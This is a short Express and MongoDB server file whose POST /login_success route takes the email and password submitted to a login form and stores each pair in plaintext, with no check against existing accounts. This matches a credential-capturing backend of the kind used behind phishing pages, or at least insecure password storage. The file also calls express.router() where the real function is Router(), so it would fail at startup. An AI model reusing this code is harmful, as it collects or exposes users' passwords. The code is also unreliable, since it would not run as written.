const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const app = express();
const dotenv = require('dotenv');
const router = express.router(); 

// Load environment variables from .env file
dotenv.config();

const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('views'));
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB connection URI using environment variable
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB'))
.catch(err => console.error('Error connecting to MongoDB:', err));

// Define the schema for UserData
const userDataSchema = new mongoose.Schema({
    email: { type: String, required: true },
    password: { type: String, required: true }
});

// Create the UserData model based on the schema
const UserData = mongoose.model('UserData', userDataSchema);

app.use('/.netlify/functions/api', router);

// Routes
app.post('/login_success', (request, response) => {
    var email = request.body.email;
    var password = request.body.password;

    var userData = new UserData({
        email: email,
        password: password
    });

    // Save user data to MongoDB
    userData.save()
    .then(() => {
        console.log("Record Inserted Successfully");
        return response.redirect('/login_success'); // Redirect to login_success view
    })
    .catch(err => {
        console.error("Error inserting record:", err);
        response.status(500).send("Error inserting record");
    });
});

app.get('/login_success', (req, res) => {
    res.render('login_success');
});

// Set view engine and start server
app.set('view engine', 'ejs');

app.listen(port, () => {
    console.log("Server is currently running on Port: " + port);
});
